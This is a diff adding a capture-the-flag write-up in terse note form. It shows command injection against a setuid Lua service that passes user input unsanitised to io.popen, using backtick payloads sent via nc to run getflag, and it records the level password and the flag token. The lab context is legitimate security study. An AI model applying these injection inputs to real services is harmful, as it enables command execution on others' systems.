@@ -1,0 +1,37 @@
+login/pw:
+	level11 : woupa2yuojeeaaed06riuj63c
+
+RESOLUTION:
+	ls -l
+		=> -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
+			=> Let's read then
+	./level11.lua
+		=> lua: ./level11.lua:3: address already in use
+		=> [C]: in function 'assert'
+			=> in file: assert(socket.bind("127.0.0.1", 5151))
+	netstat -plunt
+		=>  tcp        0      0 127.0.0.1:5151          0.0.0.0:*
+			At first I thought about a port forwarding to break the hash but after digging a bit more into the code, it's not necessary
+	cat level11.lua
+		=> client:send("Password: ")
+			nc localhost 5151
+				=> Password:
+		=> local l, err = client:receive()
+			=> l stores our messages
+		=> local h = hash(l)
+			=> function hash(pass)
+				=> prog = io.popen("echo "..pass.." | sha1sum", "r")
+					=> It looks like bash commands
+						first link
+						=> https://stackoverflow.com/questions/5239317/io-popen-how-to-wait-for-process-to-finish-in-lua
+					=> Looks like a basic echo command
+	nc localhost 5151
+		=> Password: `sleep 2`
+			=> it works
+		We dont have the command output so lets redirect it
+	nc localhost 5151
+		=> Password: `getflag > /tmp/hola`
+	cat /tmp/hola
+		=> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+	
+
